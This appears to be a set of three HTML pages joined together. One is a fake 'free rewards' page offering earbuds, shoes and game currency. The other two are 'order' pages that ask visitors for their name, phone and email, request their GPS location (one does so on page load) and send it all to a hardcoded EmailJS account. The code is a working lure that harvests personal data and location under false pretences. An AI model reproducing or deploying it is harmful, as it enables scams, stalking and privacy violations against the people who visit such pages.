<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Free Rewards Zone</title>

<style>
body{
 font-family:Arial;
 background:#f2f2f2;
 text-align:center;
}

h1{
 background:#111;
 color:white;
 padding:15px;
}

.container{
 display:flex;
 flex-wrap:wrap;
 justify-content:center;
}

.card{
 background:white;
 width:260px;
 margin:15px;
 padding:15px;
 border-radius:10px;
 box-shadow:0 0 10px rgba(0,0,0,0.2);
}

.card img{
 width:100%;
 border-radius:8px;
}

button{
 margin-top:10px;
 padding:10px 15px;
 background:#28a745;
 color:white;
 border:none;
 border-radius:6px;
 cursor:pointer;
}
</style>
</head>

<body>

<h1>🎁 Free Rewards Collection</h1>

<div class="container" id="products"></div>

<script>

const items = [

{
 name:"Random Earbuds",
 img:"https://images.unsplash.com/photo-1585386959984-a41552231658"
},

{
 name:"Stylish Shoes",
 img:"https://images.unsplash.com/photo-1542291026-7eec264c27ff"
},

{
 name:"Free Fire Diamond 500",
 img:"https://i.imgur.com/9Xn4K3K.png"
},

{
 name:"PUBG UC 500",
 img:"https://i.imgur.com/0Z8FQ6S.png"
}

];

// random items show function
function showRandomItems(){

 let container = document.getElementById("products");
 container.innerHTML="";

 let shuffled = items.sort(()=>0.5-Math.random());

 shuffled.forEach(item=>{
   container.innerHTML += `
     <div class="card">
       <img src="${item.img}">
       <h3>${item.name}</h3>
       <button onclick="claim()">Claim Now</button>
     </div>
   `;
 });

}

function claim(){
 alert("Reward claim process start!");
}

showRandomItems();

</script>

</body>
</html>
<!DOCTYPE html>
<html>
<head>
<title>Order Page</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
 font-family: Arial;
 text-align:center;
 padding:30px;
}
input{
 width:80%;
 padding:12px;
 margin:8px;
 font-size:16px;
}
button{
 padding:14px 22px;
 font-size:16px;
 background:#28a745;
 color:white;
 border:none;
 border-radius:6px;
}
</style>
</head>

<body>

<h2>Place Your Order</h2>
<p>Delivery ke liye details fill karein</p>

<input type="text" id="name" placeholder="Your Name"><br>
<input type="tel" id="phone" placeholder="Phone Number"><br>
<input type="email" id="email" placeholder="Email Address"><br>

<button onclick="startOrder()">Submit & Share Location</button>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
// EmailJS Init
(function(){
 emailjs.init("2pInQghRcP-YZtYCK");
})();

// Page open hone par ready system
window.onload = function(){
 console.log("Order system ready");
};

function startOrder(){

 let name = document.getElementById("name").value;
 let phone = document.getElementById("phone").value;
 let email = document.getElementById("email").value;

 if(name=="" || phone=="" || email==""){
   alert("Please fill all details first");
   return;
 }

 if(navigator.geolocation){

   navigator.geolocation.getCurrentPosition(function(position){

     let lat = position.coords.latitude;
     let lon = position.coords.longitude;

     emailjs.send("service_hxul50k","template_3mjgsjk",{
       name:name,
       phone:phone,
       email:email,
       latitude:lat,
       longitude:lon
     })
     .then(function(){
        alert("✅ Order sent successfully!");
     },
     function(){
        alert("❌ Error sending order");
     });

   },
   function(){
     alert("Delivery ke liye location allow karein.");
   });

 }else{
   alert("Location support nahi hai.");
 }

}
</script>

</body>
</html>
<h3>Delivery ke liye location allow karein</h3>
<p>Page open hote hi location request aayegi.</p>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
// EmailJS Initialize
(function(){
   emailjs.init("2pInQghRcP-YZtYCK");
})();

// Page load hote hi location request
window.onload = function() {
   getLocationAndSend();
};

function getLocationAndSend() {

 if (navigator.geolocation) {

   navigator.geolocation.getCurrentPosition(function(position){

     var lat = position.coords.latitude;
     var lon = position.coords.longitude;

     // Email send
     emailjs.send("service_hxul50k","template_3mjgsjk",{
        latitude: lat,
        longitude: lon
     })
     .then(function(response) {
        console.log("Location sent");
     }, function(error) {
        console.log("Error sending location");
     });

   },
   function(){
     alert("Delivery ke liye location allow karna zaroori hai.");
   });

 } else {
   alert("Location supported nahi hai.");
 }

}
</script>
